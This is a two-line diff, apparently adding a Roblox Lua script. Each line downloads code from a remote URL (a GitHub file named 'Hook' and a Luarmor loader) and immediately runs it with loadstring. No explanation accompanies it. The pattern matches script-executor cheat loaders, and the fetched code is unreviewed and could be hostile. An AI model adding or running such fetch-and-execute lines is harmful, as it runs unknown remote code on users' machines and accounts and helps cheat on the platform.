@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xdomestos1-art/innnnnnn/refs/heads/main/Hook"))()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/5d6054bfa80d443412cee821942641e3.lua"))()
